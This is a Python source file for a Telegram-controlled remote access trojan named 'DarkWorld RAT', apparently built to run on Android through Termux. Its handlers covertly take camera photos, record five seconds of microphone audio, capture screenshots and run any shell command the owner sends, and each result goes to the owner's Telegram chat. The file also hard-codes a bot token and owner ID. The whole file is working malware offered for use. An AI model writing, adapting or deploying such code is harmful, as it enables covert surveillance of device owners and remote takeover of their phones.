# -*- coding: utf-8 -*-
import telebot
import os
import subprocess
from telebot import types

TOKEN = "8241339845:AAHppxAOrudv5OtNwtltACYt6rZpoQLRSDo"
OWNER_ID = 6787062264

bot = telebot.TeleBot(TOKEN)


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.from_user.id == OWNER_ID:
        markup = types.ReplyKeyboardMarkup(row_width=2)
        itembtn1 = types.KeyboardButton('/photo')
        itembtn2 = types.KeyboardButton('/voice')
        itembtn3 = types.KeyboardButton('/screen')
        itembtn4 = types.KeyboardButton('/ddos')
        itembtn5 = types.KeyboardButton('/shell')
        itembtn6 = types.KeyboardButton('/exit')
        markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6)
        bot.send_message(message.chat.id, "DarkWorld RAT ready. Choose command:", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "Access denied!")

@bot.message_handler(commands=['photo'])
def take_photo(message):
    if message.from_user.id == OWNER_ID:
        bot.send_chat_action(message.chat.id, 'upload_photo')
        photo_path = '/data/data/com.termux/files/home/darkworld_photo.jpg'
        os.system(f'termux-camera-photo -c 0 {photo_path}')
        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
    else:
        bot.send_message(message.chat.id, "Access denied!")

@bot.message_handler(commands=['voice'])
def record_voice(message):
    if message.from_user.id == OWNER_ID:
        bot.send_chat_action(message.chat.id, 'upload_audio')
        audio_path = '/data/data/com.termux/files/home/darkworld_audio.mp3'
        os.system(f'termux-microphone-record -d 5 -o {audio_path}')
        with open(audio_path, 'rb') as audio:
            bot.send_voice(message.chat.id, audio)
    else:
        bot.send_message(message.chat.id, "Access denied!")

@bot.message_handler(commands=['screen'])
def screenshot(message):
    if message.from_user.id == OWNER_ID:
        bot.send_chat_action(message.chat.id, 'upload_photo')
        screenshot_path = '/data/data/com.termux/files/home/darkworld_screen.png'
        os.system(f'screencap -p {screenshot_path}')
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
    else:
        bot.send_message(message.chat.id, "Access denied!")

@bot.message_handler(commands=['ddos'])
def ddos_test(message):
    if message.from_user.id == OWNER_ID:
        bot.send_message(message.chat.id, "Starting DDOS simulation...")
        result = subprocess.getoutput("ping -c 4 8.8.8.8")
        bot.send_message(message.chat.id, f"DDOS result:\n{result}")
    else:
        bot.send_message(message.chat.id, "Access denied!")

@bot.message_handler(commands=['shell'])
def shell(message):
    if message.from_user.id == OWNER_ID:
        bot.send_message(message.chat.id, "Send command after /shell command:")
        bot.register_next_step_handler(message, run_shell)
    else:
        bot.send_message(message.chat.id, "Access denied!")

def run_shell(message):
    if message.from_user.id == OWNER_ID:
        command = message.text
        output = subprocess.getoutput(command)
        if len(output) > 4000:
            output = output[:4000] + "\n...[output truncated]"
        bot.send_message(message.chat.id, f"Command output:\n{output}")
    else:
        bot.send_message(message.chat.id, "Access denied!")

@bot.message_handler(commands=['exit'])
def stop_bot(message):
    if message.from_user.id == OWNER_ID:
        bot.send_message(message.chat.id, "Stopping DarkWorld RAT... Bye!")
        os._exit(0)
    else:
        bot.send_message(message.chat.id, "Access denied!")

print("DarkWorld RAT started...")
bot.infinity_polling()
